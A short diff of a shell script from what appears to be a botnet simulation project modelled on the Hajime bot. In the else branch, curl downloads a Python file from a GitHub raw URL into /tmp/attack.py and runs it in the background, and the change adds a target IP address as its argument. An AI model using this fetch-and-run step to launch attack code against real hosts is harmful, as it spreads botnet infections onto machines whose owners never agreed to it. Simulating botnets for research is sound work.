@@ -17,5 +17,5 @@ then
 else 
     echo "Starting process."
     /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/hajime_node/others/init_bot.py > /tmp/attack.py
-    python3 /tmp/attack.py  &
+    python3 /tmp/attack.py 192.168.1.48 &
 fi
